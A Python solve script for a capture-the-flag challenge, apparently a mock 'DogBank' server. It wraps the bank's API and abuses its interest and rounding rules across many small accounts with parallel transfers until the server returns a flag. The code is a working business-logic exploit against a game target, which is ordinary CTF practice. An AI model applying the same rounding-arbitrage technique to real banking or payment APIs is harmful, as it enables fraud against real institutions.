import logging
from functools import partial
from urllib.parse import urljoin
from concurrent import futures
from concurrent.futures import ThreadPoolExecutor

import requests

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class DogBankAPI:

    url = "http://202.38.93.111:10100/"
    headers = {
        "Authorization": "",
    }

    def reset(self):
        url = urljoin(self.url, "api/reset")
        headers = self.headers
        r = requests.post(url, headers=headers)
        logger.debug(f"{r.request.headers=}")
        r.raise_for_status()
        logger.debug(f"{r.text=}")

    def user(self) -> dict:
        url = urljoin(self.url, "api/user")
        headers = self.headers
        r = requests.get(url, headers=headers)
        logger.debug(f"{r.request.headers=}")
        r.raise_for_status()
        logger.debug(f"{r.text=}")
        return r.json()

    def create(self, type_: str):
        if type_ not in ("debit", "credit"):
            raise ValueError("type_ must be either 'debit' or 'credit'")
        url = urljoin(self.url, "api/create")
        headers = self.headers
        json_ = {"type": type_}
        r = requests.post(url, headers=headers, json=json_)
        logger.debug(f"{r.request.headers=}")
        logger.debug(f"{r.request.body=}")
        r.raise_for_status()
        logger.debug(f"{r.text=}")

    def eat(self, account: int):
        url = urljoin(self.url, "api/eat")
        headers = self.headers
        json_ = {"account": account}
        r = requests.post(url, headers=headers, json=json_)
        logger.debug(f"{r.request.headers=}")
        logger.debug(f"{r.request.body=}")
        r.raise_for_status()
        logger.debug(f"{r.text=}")

    def transfer(self, src: int, dst: int, amount: int):
        url = urljoin(self.url, "api/transfer")
        headers = self.headers
        json_ = {
            "src": src,
            "dst": dst,
            "amount": amount,
        }
        r = requests.post(url, headers=headers, json=json_)
        logger.debug(f"{r.request.headers=}")
        logger.debug(f"{r.request.body=}")
        r.raise_for_status()
        logger.debug(f"{r.text=}")

    def transactions(self, account: int) -> list:
        url = urljoin(self.url, "api/transactions")
        headers = self.headers
        params = {"account": account}
        r = requests.post(url, headers=headers, params=params)
        logger.debug(f"{r.request.headers=}")
        r.raise_for_status()
        logger.debug(f"{r.text=}")
        return r.json()["transactions"]


def firstday(d: DogBankAPI, executor: ThreadPoolExecutor):
    d.reset()
    def create_credit(i):
        d.create("credit")
        d.transfer(src=i, dst=1, amount=2099)
    def create_debit(i):
        d.create("debit")
        d.transfer(src=1, dst=i, amount=167)
    map = executor.map
    list(map(create_credit, range(2, 12)))
    list(map(create_debit, range(12, 143)))
    d.eat(1)

def otherday(d: DogBankAPI, executor: ThreadPoolExecutor):
    user = d.user()
    date = user["date"]
    balance = sum((1 if acc["type"] == "debit" else -1) * acc["balance"] \
                  for acc in user["accounts"])
    logger.info(f"{date=}, {balance=}")
    if user["flag"] is not None:
        return user["flag"]

    map = executor.map
    list(map(lambda src: d.transfer(src, (src+8)//10, amount=1), range(12, 112)))
    list(map(lambda src: d.transfer(src, 1, amount=1), range(112, 143)))
    d.eat(1)

def main():
    d = DogBankAPI()
    with ThreadPoolExecutor(20) as executor:
        firstday(d, executor)
        flag = None
        while not flag:
            flag = otherday(d, executor)
    print(flag)


if __name__ == "__main__":
    main()
